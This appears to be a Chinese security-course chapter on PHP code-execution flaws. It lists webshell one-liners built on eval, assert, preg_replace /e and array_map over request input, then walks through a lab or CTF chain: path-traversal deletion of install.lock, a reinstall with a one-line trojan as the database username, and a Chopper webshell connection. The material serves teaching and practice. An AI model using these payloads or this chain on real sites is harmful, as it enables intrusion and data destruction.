# Chapter 8.6 代码执行漏洞

## 0x00 常用代码执行语法

1. ```php
   eval($_REQUEST[8]);//eval是代码执行用的最多的，它可以多行执行。
   ```
```

2.
​```php
assert($_REQUEST[8])//只能单行执行， assert想要多行执行需要写文件然后执行，例如：
```

3.
```php
file_put_contents('1.php','<?php var_dump(8);phpinfo();?>')
```

4.
```php
preg_replace() //正则替换函数， 其实也会产生代码执行。
   preg_replace('/a/','x','abc');
   <?php echo preg_replace('/a/e',$_GET[8],'abc');?>
```

5.
```php
create_function() //匿名函数
   $a = create_function('$id','echo $id;');自定义函数$a```
```
6.
```php
echo $a(8); //执行echo $id；因为$id我传参是8所以 echo $id;
```
7.
```php
array_map() //回调函数，调用某个函数
   array_map('assert',array($_ROST['c']));
   array_map($_REQUEST['b'],array($_REQUEST['c']));
```

8.
```php
call_user_func()
```

9.
```php
特殊组合（双引号二次解析）  PHP版本5.5及其以上版本可用
```

10.
```php
"${phpinfo()}";  => 代码执行phpinfo()
//PHP的字符串是可以使用复杂的表达式。例如${中间可以写调用的函数}
${phpinfo()};
$a = ${phpinfo()};
```

## 0x01 漏洞复现

1. 通过网页末端支持信息得知CMS，下载源码进行审计

![](https://nc0.cdn.zkaq.cn/md/5371/760a0fbe410de9a5a4efb73623ff97d8_63846.png)
2. 通过代码审计发现问题：在某处上传手机LOGO时没有进行校验，可以利用此漏洞进行任意文件删除

![](https://nc0.cdn.zkaq.cn/md/5371/b29597e59fd6a9b3a4303dbb92e5b08d_28360.png)
2. 加入die()函数获取页面回显，抓包

![](https://nc0.cdn.zkaq.cn/md/5371/7b5d57282ef8fd5f73a9c91869683659_98985.png)

3. 抓包后修改使用`../../../../data/install.lock`跳到需要删除的目录文件，尝试删除

![](https://nc0.cdn.zkaq.cn/md/5371/18e50468b40a13463c13be247f7b84ac_43330.png)
4. 删除成功，出现安装界面

![](https://nc0.cdn.zkaq.cn/md/5371/d24dd9e1c0499b74642e3139dcdc7049_93578.png)
5. 在新建数据库时数据库账号使用一句话木马

![](https://nc0.cdn.zkaq.cn/md/5371/00e54ff71db7d072ec3c6f0a9ace2f2b_53715.png)
6. 成功读取phpinfo

![](https://nc0.cdn.zkaq.cn/md/5371/02e47df0913e1616a3a3af82cac60123_65184.png)
7. 菜刀连接,得到flag

![](https://nc0.cdn.zkaq.cn/md/5371/0394039b99c6c350d92c417ca0f0c974_42826.png)

